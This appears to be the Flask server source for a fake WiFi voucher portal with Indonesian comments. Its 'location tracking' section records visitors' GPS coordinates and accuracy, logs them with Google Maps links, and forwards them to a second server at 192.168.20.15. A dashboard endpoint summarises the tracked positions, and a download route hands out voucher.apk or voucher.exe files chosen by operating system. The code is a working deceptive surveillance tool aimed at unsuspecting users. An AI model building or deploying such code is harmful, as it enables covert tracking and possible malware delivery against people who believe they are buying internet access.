from flask import Flask, request, redirect, url_for, send_from_directory, jsonify, render_template
from datetime import datetime, date
import requests
import os
import json
from voucher import generate_voucher  

app = Flask(__name__)

LOG_DIR = 'logs'
LOCATION_FILE = os.path.join(LOG_DIR, 'berhasil.txt')

valid_vouchers = set()  

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

if not os.path.exists(LOCATION_FILE):
    with open(LOCATION_FILE, 'w', encoding='utf-8') as f:
        pass

# Paket layanan
WIFI_PACKAGES = {
    'basic': {'name': 'Standar', 'speed': '10 Mbps', 'duration': '1 jam', 'duration_seconds': 3600},
    'premium': {'name': 'Premium', 'speed': '25 Mbps', 'duration': '3 jam', 'duration_seconds': 10800},
    'unlimited': {'name': 'Unlimited', 'speed': '50 Mbps', 'duration': '24 jam', 'duration_seconds': 86400},
    'business': {'name': 'Bisnis', 'speed': '100 Mbps', 'duration': '72 jam', 'duration_seconds': 259200}
}

# === VOUCHER ROUTES ===

@app.route('/generate-voucher', methods=['GET'])
def generate_voucher_code():
    code = generate_voucher()
    valid_vouchers.add(code)
    print(f"[INFO] Voucher dibuat: {code}")
    return jsonify({"voucher": code})

@app.route('/download-voucher')
def download_voucher():
    user_agent = request.user_agent.string.lower()

    if "android" in user_agent:
        print("[INFO] User menggunakan Android - mengirim voucher.apk")
        return send_from_directory('dist', 'voucher.apk', as_attachment=True)

    elif "windows" in user_agent:
        print("[INFO] User menggunakan Windows - mengirim voucher.exe")
        return send_from_directory('dist', 'voucher.exe', as_attachment=True)

    else:
        print(f"[INFO] User-Agent tidak dikenali: {user_agent}")
        return send_from_directory('dist', 'voucher.py', as_attachment=True)



@app.route('/store-voucher', methods=['POST'])
def store_voucher():
    data = request.get_json()
    code = data.get("voucher_code", "").strip().upper()
    if code:
        valid_vouchers.add(code)
        print(f"[INFO] Voucher disimpan: {code}")
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "invalid"}), 400

@app.route('/validate-voucher', methods=['POST'])
def validate_voucher():
    data = request.get_json()
    code = data.get("voucher_code", "").strip().upper()
    if code in valid_vouchers:
        valid_vouchers.remove(code)
        print(f"[INFO] Voucher valid digunakan: {code}")
        return jsonify({"valid": True})
    print(f"[WARN] Voucher tidak valid: {code}")
    return jsonify({"valid": False})

# === PELACAKAN LOKASI ===

@app.route('/result', methods=['POST'])
def result():
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    accuracy = request.form.get('accuracy', 'N/A')
    service = request.form.get('service', 'basic')

    try:
        lat_float = float(lat)
        lon_float = float(lon)
        if not (-90 <= lat_float <= 90) or not (-180 <= lon_float <= 180):
            raise ValueError("Koordinat tidak valid")
    except (ValueError, TypeError):
        print(f"[!] Data lokasi tidak valid: Latitude={lat}, Longitude={lon}")
        return redirect(url_for('success', service=service))

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    print(f"[{timestamp}] Lokasi diterima: Latitude={lat}, Longitude={lon}, Akurasi={accuracy}m")
    print(f"[{timestamp}] Google Maps Link: {maps_link}")
    print(f"[{timestamp}] Paket yang dipilih: {service}")

    with open(LOCATION_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {lat},{lon} (Akurasi: {accuracy}m) => {maps_link}\n")
        
    data_to_send = {
        'timestamp': timestamp,
        'latitude': lat,
        'longitude': lon,
        'accuracy': accuracy,
        'maps_link': maps_link
    }

    # Kirim ke app.py
    try:
        response = requests.post('http://192.168.20.15:5000/save-log', json=data_to_send)
        if response.status_code == 200:
            print("[+] Data berhasil disimpan di server Utama")
        else:
            print(f"[!] Gagal menyimpan data. Status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Error saat mengirim data: {e}")


    # Simpan juga ke logs/berhasil.txt
    try:
        with open(LOCATION_FILE, 'a', encoding='utf-8') as f:
            json.dump(data_to_send, f)
            f.write('\n')
        print("[+] Data berhasil ditulis ke logs/berhasil.txt")
    except Exception as e:
        print(f"[!] Gagal menulis ke berhasil.txt: {e}")

    return redirect(url_for('success'))

    return redirect(url_for('success', service=service))

@app.route('/get-location-data')
def get_location_data():
    try:
        with open(LOCATION_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        entries = []
        today = date.today().strftime("%Y-%m-%d")
        today_entries = 0
        total_accuracy = 0
        best_accuracy = float('inf')

        for line in lines:
            if not line.strip():
                continue
            parts = line.split('] ')
            timestamp = parts[0][1:]
            rest = parts[1].split(' (Akurasi: ')
            lat_lon = rest[0]
            accuracy_part = rest[1].split('m) => ')[0]

            try:
                accuracy = float(accuracy_part)
                lat, lon = lat_lon.split(',')

                entry = {
                    'timestamp': timestamp,
                    'latitude': lat,
                    'longitude': lon,
                    'accuracy': accuracy,
                    'maps_link': f"https://www.google.com/maps?q={lat},{lon}"
                }
                entries.append(entry)

                total_accuracy += accuracy
                if accuracy < best_accuracy:
                    best_accuracy = accuracy

                if timestamp.startswith(today):
                    today_entries += 1
            except (ValueError, IndexError) as e:
                print(f"Error parsing line: {line}. Error: {e}")
                continue

        avg_accuracy = total_accuracy / len(entries) if entries else 0

        return jsonify({
            'entries': entries,
            'total_entries': len(entries),
            'today_entries': today_entries,
            'best_accuracy': round(best_accuracy, 2),
            'avg_accuracy': round(avg_accuracy, 2)
        })

    except FileNotFoundError:
        return jsonify({
            'entries': [],
            'total_entries': 0,
            'today_entries': 0,
            'best_accuracy': 0,
            'avg_accuracy': 0
        })

# === HALAMAN DAN API TAMBAHAN ===

@app.route('/success')
def success():
    service = request.args.get('service', 'basic')
    return render_template('berhasil.html')

@app.route('/get-package-info')
def get_package_info():
    service = request.args.get('service', 'basic')
    return jsonify(WIFI_PACKAGES.get(service, WIFI_PACKAGES['basic']))

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    if not os.path.exists(LOCATION_FILE):
        with open(LOCATION_FILE, 'w') as f:
            pass
    app.run(host='0.0.0.0', port=5500, debug=True)
